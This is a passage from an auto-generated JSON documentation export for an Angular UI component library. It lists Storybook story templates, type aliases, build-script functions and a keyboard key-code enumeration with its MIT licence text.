        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "WithAppHeader",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "(args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: { ...args, activate: action('Activate route') },\n    template: `\n    <sto-app-header></sto-app-header>\n    <sto-nav-drawer (activate)=\"collapsed = true; activate($event)\" [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\n    `\n  };\n}"
      },
      {
        "name": "withForm",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoAppHeaderComponent>",
        "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n  <div class=\"sto-header__form\">\n    <mat-form-field stoFormField floatLabel=\"never\" style=\"width: 600px\">\n      <mat-icon matPrefix>search</mat-icon>\n      <mat-label>Search</mat-label>\n      <input matInput>\n    </mat-form-field>\n  </div>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
      },
      {
        "name": "WithUserMenu",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoAppHeaderComponent>",
        "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n<button mat-icon-button><mat-icon>home</mat-icon></button>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
      },
      {
        "name": "writeFile",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/build-scss.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "promisify(writeFileCb)"
      }
    ],
    "functions": [
      {
        "name": "LoggerFactory",
        "file": "libs/error-handler/src/lib/wrapper.ts",
        "ctype": "miscellaneous",
        "subtype": "function",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "args": [
          {
            "name": "http",
            "type": "HttpClient",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "jsdoctags": [
          {
            "name": "http",
            "type": "HttpClient",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      {
        "name": "processScss",
        "file": "tools/scripts/build-scss.ts",
        "ctype": "miscellaneous",
        "subtype": "function",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "args": [
          {
            "name": "file",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "outFile",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "returnType": "Promise<void>",
        "jsdoctags": [
          {
            "name": "file",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "outFile",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    ],
    "typealiases": [
      {
        "name": "ClassFunction",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "function",
        "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 178
      },
      {
        "name": "CommonNavigation",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "literal type",
        "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 181
      },
      {
        "name": "Data",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "literal type",
        "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 181
      },
      {
        "name": "Divider",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"below\" | \"above\" | null",
        "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "Handler",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "function",
        "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 178
      },
      {
        "name": "HeaderContextMenu",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "ContextMenu",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 177
      },
      {
        "name": "Menu",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "literal type",
        "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 181
      },
      {
        "name": "Menu",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 187
      },
      {
        "name": "Navigation",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "",
        "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 187
      },
      {
        "name": "NavigationChild",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "",
        "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 187
      },
      {
        "name": "NumberUnitForm",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "literal type",
        "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 181
      },
      {
        "name": "PaneType",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"left\" | \"right\"",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "ReturnValue",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "Promise<T> | Observable<T> | T",
        "file": "libs/common/src/lib/theme/theme-saver.service.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "rowClassFn",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "function",
        "file": "libs/datatable/src/lib/sto-datatable/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 178
      },
      {
        "name": "RowContextMenu",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 187
      },
      {
        "name": "SortFunction",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "function",
        "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 178
      },
      {
        "name": "ThemeClassName",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "ThemeName",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"light\" | \"dark\"",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "TypographyClassName",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      },
      {
        "name": "TypographyName",
        "ctype": "miscellaneous",
        "subtype": "typealias",
        "rawtype": "\"small\" | \"medium\" | \"large\"",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "kind": 186
      }
    ],
    "enumerations": [
      {
        "name": "ColumnDisplay",
        "childs": [
          {
            "name": "Flex",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "flex"
          },
          {
            "name": "Force",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "force"
          }
        ],
        "ctype": "miscellaneous",
        "subtype": "enum",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
      },
      {
        "name": "Key",
        "childs": [
          {
            "name": "Backspace",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 8
          },
          {
            "name": "Tab",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 9
          },
          {
            "name": "Enter",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 13
          },
          {
            "name": "Shift",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 16
          },
          {
            "name": "Ctrl",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 17
          },
          {
            "name": "Alt",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 18
          },
          {
            "name": "PauseBreak",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 19
          },
          {
            "name": "CapsLock",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 20
          },
          {
            "name": "Escape",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 27
          },
          {
            "name": "Space",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 32
          },
          {
            "name": "PageUp",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 33
          },
          {
            "name": "PageDown",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 34
          },
          {
            "name": "End",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 35
          },
          {
            "name": "Home",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 36
          },
          {
            "name": "LeftArrow",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 37
          },
          {
            "name": "UpArrow",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 38
          },
          {
            "name": "RightArrow",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 39
          },
          {
            "name": "DownArrow",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 40
          },
          {
            "name": "Insert",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 45
          },
          {
            "name": "Delete",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 46
          },
          {
            "name": "Zero",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 48
          },
          {
            "name": "ClosedParen",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Zero"
          },
          {
            "name": "One",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 49
          },
          {
            "name": "ExclamationMark",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "One"
          },
          {
            "name": "Two",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 50
          },
          {
            "name": "AtSign",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Two"
          },
          {
            "name": "Three",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 51
          },
          {
            "name": "PoundSign",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Three"
          },
          {
            "name": "Hash",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "PoundSign"
          },
          {
            "name": "Four",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 52
          },
          {
            "name": "DollarSign",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Four"
          },
          {
            "name": "Five",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 53
          },
          {
            "name": "PercentSign",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Five"
          },
          {
            "name": "Six",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 54
          },
          {
            "name": "Caret",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Six"
          },
          {
            "name": "Hat",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Caret"
          },
          {
            "name": "Seven",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 55
          },
          {
            "name": "Ampersand",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Seven"
          },
          {
            "name": "Eight",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 56
          },
          {
            "name": "Star",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Eight"
          },
          {
            "name": "Asterik",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Star"
          },
          {
            "name": "Nine",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 57
          },
          {
            "name": "OpenParen",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Nine"
          },
          {
            "name": "A",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 65
          },
          {
            "name": "B",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 66
          },
          {
            "name": "C",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 67
          },
          {
            "name": "D",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 68
          },
          {
            "name": "E",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 69
          },
          {
            "name": "F",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 70
          },
          {
            "name": "G",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 71
          },
          {
            "name": "H",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 72
          },
          {
            "name": "I",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 73
          },
          {
            "name": "J",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 74
          },
          {
            "name": "K",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 75
          },
          {
            "name": "L",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 76
          },
          {
            "name": "M",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 77
          },
          {
            "name": "N",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 78
          },
          {
            "name": "O",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 79
          },
          {
            "name": "P",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 80
          },
          {
            "name": "Q",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 81
          },
          {
            "name": "R",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 82
          },
          {
            "name": "S",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 83
          },
          {
            "name": "T",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 84
          },
          {
            "name": "U",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 85
          },
          {
            "name": "V",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 86
          },
          {
            "name": "W",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 87
          },
          {
            "name": "X",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 88
          },
          {
            "name": "Y",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 89
          },
          {
            "name": "Z",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 90
          },
          {
            "name": "LeftWindowKey",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 91
          },
          {
            "name": "RightWindowKey",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 92
          },
          {
            "name": "SelectKey",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 93
          },
          {
            "name": "Numpad0",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 96
          },
          {
            "name": "Numpad1",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 97
          },
          {
            "name": "Numpad2",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 98
          },
          {
            "name": "Numpad3",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 99
          },
          {
            "name": "Numpad4",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 100
          },
          {
            "name": "Numpad5",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 101
          },
          {
            "name": "Numpad6",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 102
          },
          {
            "name": "Numpad7",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 103
          },
          {
            "name": "Numpad8",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 104
          },
          {
            "name": "Numpad9",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 105
          },
          {
            "name": "Multiply",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 106
          },
          {
            "name": "Add",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 107
          },
          {
            "name": "Subtract",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 109
          },
          {
            "name": "DecimalPoint",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 110
          },
          {
            "name": "Divide",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 111
          },
          {
            "name": "F1",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 112
          },
          {
            "name": "F2",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 113
          },
          {
            "name": "F3",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 114
          },
          {
            "name": "F4",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 115
          },
          {
            "name": "F5",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 116
          },
          {
            "name": "F6",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 117
          },
          {
            "name": "F7",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 118
          },
          {
            "name": "F8",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 119
          },
          {
            "name": "F9",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 120
          },
          {
            "name": "F10",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 121
          },
          {
            "name": "F11",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 122
          },
          {
            "name": "F12",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 123
          },
          {
            "name": "NumLock",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 144
          },
          {
            "name": "ScrollLock",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 145
          },
          {
            "name": "SemiColon",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 186
          },
          {
            "name": "Equals",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 187
          },
          {
            "name": "Comma",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 188
          },
          {
            "name": "Dash",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 189
          },
          {
            "name": "Period",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 190
          },
          {
            "name": "UnderScore",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Dash"
          },
          {
            "name": "PlusSign",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Equals"
          },
          {
            "name": "ForwardSlash",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 191
          },
          {
            "name": "Tilde",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 192
          },
          {
            "name": "GraveAccent",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "Tilde"
          },
          {
            "name": "OpenBracket",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 219
          },
          {
            "name": "ClosedBracket",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 221
          },
          {
            "name": "Quote",
            "deprecated": false,
            "deprecationMessage": "",
            "value": 222
          }
        ],
        "ctype": "miscellaneous",
        "subtype": "enum",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
        "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
      },
      {
        "name": "MenuItemTypes",
        "childs": [
          {
            "name": "External",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "externalLink"
          },
          {
            "name": "ExternalNew",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "externalLinkNewWindow"
          },
          {
            "name": "Internal",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "internalLink"
          },
          {
            "name": "Navigate",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "navigate"
          }
        ],
        "ctype": "miscellaneous",
        "subtype": "enum",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
      },
      {
        "name": "SelectionModes",
        "childs": [
          {
            "name": "Click",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "click"
          },
          {
            "name": "DoubleClick",
            "deprecated": false,
            "deprecationMessage": "",
            "value": "dblclick"
          }
        ],
        "ctype": "miscellaneous",
        "subtype": "enum",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
      }
    ],
    "groupedVariables": {
      "libs/common/src/lib/sto-message-panel/message-panel.stories.ts": [
        {
          "name": "Accent",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "argTypes",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "defaultValue": "{\n  color: { control: { disable: true } },\n  dismissable: { control: { disable: true } },\n  icon: { control: { disable: true } },\n  severity: { control: { disable: true } },\n}"
        },
        {
          "name": "Danger",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "Dismissable",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    props: { dismiss: action('Dismissed') },\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "Primary",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "Success",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    component: StoMessagePanelComponent,\n    props: { ...args, dismissed: action('Dismissed') },\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "UsageWithInput",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Warn",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\n  };\n}"
        },
        {
          "name": "Warning",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoMessagePanelComponent>",
          "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\n  };\n}"
        }
      ],
      "libs/datatable/src/lib/datatable-custom.stories.ts": [
        {
          "name": "Actionbar",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
          "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With an actionbar on the top left and right side</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n  <sto-datatable-actions>\n      <sto-datatable-actions-left>\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\n       </sto-datatable-actions-left>\n      <sto-datatable-actions-right>\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\n      </sto-datatable-actions-right>\n  </sto-datatable-actions>\n</sto-datatable>`,\n} )"
        },
        {
          "name": "AutoSize",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story",
          "defaultValue": "(args) => ( {\n  props: args,\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n</sto-datatable>`,\n} )"
        },
        {
          "name": "Grouped",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
